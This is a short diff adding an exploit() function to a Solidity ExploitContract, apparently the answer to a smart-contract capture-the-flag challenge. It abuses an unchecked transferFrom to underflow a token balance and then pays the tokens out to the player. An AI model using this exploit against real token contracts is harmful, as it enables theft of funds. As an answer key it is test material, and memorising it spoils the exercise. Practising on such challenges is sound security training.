@@ -70,4 +70,9 @@ contract ExploitContract {
     }
 
     // write your exploit functions below
+    // @solution approve exploit contract for max uint256. Take advantage of transferFrom function does not check from == msg.sender. Underflow exploit contract's balance and transfer to player.
+    function exploit() public {
+        tokenWhale.transferFrom(msg.sender, msg.sender, 1);
+        tokenWhale.transfer(msg.sender, 1000000);
+    }
 }
